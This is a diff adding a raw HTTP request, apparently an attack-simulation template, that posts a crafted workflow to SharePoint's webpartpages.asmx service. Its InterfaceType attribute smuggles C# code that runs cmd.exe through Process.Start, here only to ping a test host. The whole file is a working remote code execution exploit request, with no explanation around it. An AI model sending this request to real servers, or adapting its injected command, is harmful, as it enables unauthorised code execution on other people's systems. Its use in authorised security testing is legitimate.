@@ -1,0 +1,18 @@
+POST /page{PICUSID}/_vti_bin/webpartpages.asmx HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml; charset=utf-8
+Content-Length: 971
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages"><workflowMarkupText><![CDATA[
+<SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+                            xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
+  <CallExternalMethodActivity x:Name="foo" MethodName='test1' InterfaceType='System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe","/c ping test.com");private/**/void/**/foobar(){//' />
+
+</SequentialWorkflowActivity>
+
+
+]]></workflowMarkupText><rulesText></rulesText><configBlob></configBlob><flag>2</flag></ValidateWorkflowMarkupAndCreateSupportObjects></soap:Body></soap:Envelope>
